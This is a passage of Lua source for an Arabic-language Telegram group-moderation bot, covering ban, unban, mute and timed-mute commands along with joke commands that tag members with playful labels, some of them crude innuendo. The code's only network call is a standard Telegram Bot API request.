tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if text == 'مسح الحكاكين' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم مسح كل الحكاكين')
end
if text == ("تاك للحكاكين") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n 𖥔 قائمة حكاكين الجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← الحكاك [@"..username.."]\n"
else
t = t..""..k.."← الحكاك `"..v.."`\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد حكاك"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع حكاك") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
local  statuss  = '\n 𖥔 تم رفع حكاك في الجروب\n 𖥔 احمرت ولا لسا'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل حكاك")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
status  = '\n 𖥔 تم تنزيل حكاك من الجروب\n 𖥔 لا يسطت هيفضل حكاك رسمي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text == 'مسح النسوان' and Mod(msg) then
database:del(bot_id..'Girl:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم مسح كل النسوان بالجروب')
end
if text == ("تاك للنسوان") and Mod(msg) then
local list = database:smembers(bot_id..'Girl:User'..msg.chat_id_)
t = "\n 𖥔 قائمة نسوان الجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← المره [@"..username.."]\n"
else
t = t..""..k.."← المره `"..v.."`\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد نسوان غيرك"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع مره") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Girl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
local  statuss  = '\n 𖥔 تم رفع مره في الجروب\n 𖥔 ها صرتي من نسواني تعي ندخل'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل مره")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Girl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
status  = '\n 𖥔 تم تنزيل مره من الجروب\n 𖥔 بتاعي غضبان عليكي ليوم الدين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text == 'مسح المتزوجين' and Mod(msg) then
database:del(bot_id..'Mode:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم مسح جميع المتزوجين')
end
if text == ("تاك للمتزوجين") and Mod(msg) then
local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
t = "\n 𖥔 قائمه ازواج الجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← الزوج [@"..username.."]\n"
else
t = t..""..k.."← الزوجه `"..v.."`\n"
end
end
if #list == 0 then
t = " 𖥔 مع الاسف لا يوجد متزوجين"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("زواج") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Mode:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 العضــو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n 𖥔 تم زواجكم بنجاح في الجروب \n 𖥔 الطلاق امتي عشان ابقي موجود '
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("طلاق")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Mode:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 العضــو ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
status  = '\n 𖥔 تم طلاقكم بنجاح في الجروب\n 𖥔 اوجعو تاني ونبي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end 
-----------------------------------------------------
if text == 'مسح الميتين' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم تنزيل جميع االاكساس')
end
if text == ("تاك للميتنين") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n 𖥔 قائمة الميتنين \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.." ↚ الميت[@"..username.."]\n"
else
t = t..""..k.." ↚ الميت "..v.."\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد ميتين"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("تخ") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل القتل') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n 𖥔تم قتله بنجاح\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("اصحه")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم رجوع للحياه\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text == 'مسح المحظورين' and Mod(msg) then
database:del(bot_id..'VNO:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n 𖥔 تم مسح المحظورين')
end
if text == ("المحظورين") then
local list = database:smembers(bot_id..'VNO:User'..msg.chat_id_)
t = "\n 𖥔 قائمة محظورين الجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد محظورين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("حظر") and msg.reply_to_message_id_ ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الحظر') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع حظر البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 𖥔 عذرا لا تستطيع حظر ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' 𖥔 ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 𖥔 البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'VNO:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم حظره'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
chat_kick(result.chat_id_, result.sender_user_id_)
end,nil)   
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if text and text:match("^حظر @(.*)$") and Mod(msg) then
local username = text:match("^حظر @(.*)$")
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الحظر') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 𖥔 عذرا لا تستطيع حظر ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 𖥔 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' 𖥔  ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 𖥔 البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'VNO:User'..msg.chat_id_, result.id_)
usertext = '\n 𖥔  المستخدم  ↚ ['..result.title_..'](t.me/'..(username or 'GLOBLA')..')'
status  = '\n 𖥔 تم حظره'
texts = usertext..status
chat_kick(msg.chat_id_, result.id_)
send(msg.chat_id_, msg.id_, texts)
end,nil)   
end
else
send(msg.chat_id_, msg.id_, ' 𖥔 لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^حظر (%d+)$") and Mod(msg) then
local userid = text:match("^حظر (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الحظر') 
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع حظر البوت")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 𖥔 عذرا لا تستطيع حظر ( '..Rutba(userid,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' 𖥔 ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 𖥔 البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'VNO:User'..msg.chat_id_, userid)
chat_kick(msg.chat_id_, userid)  
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم حظره'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n?? تم حظره'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end,nil)   
end
return false
end
if text == ("الغاء حظر") and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, ' 𖥔 انا لست محظورآ \n') 
return false 
end
database:srem(bot_id..'VNO:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم الغاء حظره'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,VNO) end,nil)   
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
 
if text and text:match("^الغاء حظر @(.*)$") and Mod(msg) then
local username = text:match("^الغاء حظر @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, ' 𖥔 انا لست محظورآ \n') 
return false 
end
database:srem(bot_id..'VNO:User'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,VNO) end,nil)   
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم الغاء حظره'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^الغاء حظر (%d+)$") and Mod(msg) then
local userid = text:match("^الغاء حظر (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if tonumber(userid) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, ' 𖥔 انا لست محظورآ \n') 
return false 
end
database:srem(bot_id..'VNO:User'..msg.chat_id_, userid)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,VNO) end,nil)   
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم الغاء حظره'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم الغاء حظره'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == 'مسح المكتومين' and Mod(msg) then
database:del(bot_id..'Muted:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم مسح المكتومين')
end
if text == ("المكتومين") and Mod(msg) then
local list = database:smembers(bot_id..'Muted:User'..msg.chat_id_)
t = "\n 𖥔 قائمة المكتومين \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد مكتومين"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("كتم") and msg.reply_to_message_id_ ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع كتم البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 𖥔 عذرا لا تستطيع كتم ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 𖥔 البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'Muted:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^كتم @(.*)$") and Mod(msg) then
local username = text:match("^كتم @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 𖥔 البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع كتم البوت ")
return false 
end
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 𖥔 عذرا لا تستطيع كتم ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 𖥔 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Muted:User'..msg.chat_id_, result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم كتمه'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
end
else
send(msg.chat_id_, msg.id_, ' 𖥔 لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match('^كتم (%d+) (.*)$') and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
local TextEnd = {string.match(text, "^(كتم) (%d+) (.*)$")}
function start_function(extra, result, success)
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n 𖥔 عذرا لا تستطيع كتم ( "..Rutba(result.sender_user_id_,msg.chat_id_).." )")
else
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم كتم لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if text and text:match("^(وضع وقت التنظيف) (%d+)$") and BasicConstructor(msg) then
local GetDo = tonumber(text:match("(%d+)"))
database:set(bot_id..':TiMsg:'..msg.chat_id_,GetDo) 
return send(msg.chat_id_, msg.id_,"𖥔 تم وضع وقت التنظيف:( `"..GetDo.." `) ساعه")
end

if text and text:match('^كتم (%d+) (.*) @(.*)$') and Mod(msg) then
local TextEnd = {string.match(text, "^(كتم) (%d+) (.*) @(.*)$")}
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 𖥔 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
